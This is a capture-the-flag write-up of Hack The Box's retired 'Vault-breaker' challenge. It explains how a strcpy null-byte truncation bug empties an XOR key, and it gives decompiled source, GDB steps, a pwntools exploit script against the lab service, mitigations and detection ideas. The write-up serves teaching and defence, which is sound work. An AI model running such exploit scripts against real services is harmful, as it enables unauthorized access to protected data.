---
challenge: Vault-breaker
category: Challenge
type: pwn
os: Linux
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [pwn, logic-bug, xor, strcpy, null-byte, pwntools]
---

# Vault-breaker — Hack The Box (Challenge)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired based on public writeups; not verified with an HTB session.
> No flags or real instance keys.

## TL;DR

The vault "encryption" is a XOR between the flag and a random key. The key is copied with `strcpy` from a buffer that may contain null bytes, so it truncates at the first `\0`. Generating keys of length 31, 30, … down to 0 leaves the global key empty and the XOR changes nothing: the flag comes out in clear. No memory corruption involved.

## Brief and surface

- **Pwn** category, **Very Easy** difficulty, x86-64 ELF and a remote instance.
- Menu with two options: generate a new key or "secure the vault".
- The second option prints the XOR-encrypted flag; the first lets you pick the key length (0–31).

```bash
file vault-breaker
checksec --file=vault-breaker
```

```text
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

Every protection is on and none matters: the bug is logic.

## Recon

```text
 Current status:  Unlocked 🔓
 [+] Random secure encryption key has been generated!

 1. Generate new key 🆕
 2. Secure the Vault 🔒
 >
```

Choosing `2` prints `Master password for Vault:` followed by non-printable bytes. Choosing `1` asks for a length and regenerates the key. The menu loops, so it can be iterated.

## Source analysis

Two functions hold the behaviour:

```c
void new_key_gen() {
    char new_key[40];
    size_t length = 0x22;
    FILE *f = fopen("/dev/urandom", "rb");

    while (length > 0x1f) {
        printf("[*] Length of new password (0-31): ");
        length = read_num();
    }
    memset(new_key, 0, 32);
    read(fileno(f), new_key, length);

    for (i = 0; i < length; i++)
        while (new_key[i] == '\0')
            read(fileno(f), &new_key[i], 1);

    strcpy(random_key, new_key);      // copies until the first NUL
    fclose(f);
}

void secure_password() {
    read(fileno(fp), flag, 0x17);
    for (i = 0; i < strlen(flag); i++)
        putchar(random_key[i] ^ flag[i]);
}
```

`random_key` is a global. `secure_password` reads the flag and XORs it with that global, byte by byte.

## The bug

`strcpy` copies until the first null byte, not `length` bytes. `new_key` is filled with random bytes and the loop prevents the byte **at position `i`** from being null, but it does not prevent an earlier null, nor does it clear the previous contents of `random_key`.

Reducing the length from 31 to 0 moves the terminator towards the start and each copy leaves the key shorter. At length 0, `new_key[0]` is `\0` and `strcpy` writes a single null byte to `random_key`: the key is empty and `random_key[i]` is 0 for every `i`.

```text
long key:  [ k0 k1 k2 ... k30 00 ]
short key: [ k0 00 ]
length 0:  [ 00 ]
```

`flag[i] ^ 0 = flag[i]`: the "encryption" returns the flag unchanged.

## Local reproduction

```bash
./vault-breaker
# 1 -> length 31, repeat downwards to 0
# 2 -> prints the flag
```

In GDB the global is visible after each copy:

```gdb
break *new_key_gen+299
x/4gx &random_key
```

After several iterations, all four qwords of `random_key` are zero.

## Exploitation

```python
#!/usr/bin/env python3
from pwn import *

HOST, PORT = '<IP>', '<PORT>'
p = remote(HOST, PORT)

for length in range(31, -1, -1):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(length).encode())

p.sendlineafter(b'> ', b'2')
print(p.recvall(timeout=5).decode(errors='replace'))
```

- Order matters: high to low; going up lets the key grow again.
- Length 0 is what leaves the terminator in the first byte.
- No offsets or ASLR to compute: the payload is a sequence of numbers.
- If the service limits iterations, reconnect; the key is per process.

## Evidence

- `checksec` with every protection on.
- `random_key` zeroed in GDB after the sequence.
- Local output with a test flag, never the real one.

## Lessons learned

- Encryption with a key the attacker can regenerate protects nothing, even with `/dev/urandom`.
- `strcpy` on binary data truncates at the first null; the bug is treating bytes as a string, not the XOR.
- The loop that fills null gaps does not guarantee there is no earlier null.
- Lowering the length is a way to "empty" the key without writing memory.
- Not every Pwn is corruption: reading the logic before hunting a ROP chain saves time.

## Mitigations and detection

- Use `memcpy` with an explicit length and store the key with its size, not as a C string.
- Do not let the user choose the key length; generate it fully and rotate it server-side.
- Encrypt with AES-GCM or ChaCha20-Poly1305, not XOR.
- Detection: key-generation sequences with decreasing lengths followed by a final decrypt request; zero-length keys.
- References: CWE-170 (improper null termination), CWE-327 (broken crypto), MITRE T1552.

## References

- <https://7rocky.github.io/en/ctf/htb-challenges/pwn/vault-breaker/>
- <https://cwe.mitre.org/data/definitions/170.html>
- <https://man7.org/linux/man-pages/man3/strcpy.3.html>
- <https://docs.pwntools.com/en/stable/tubes.html>
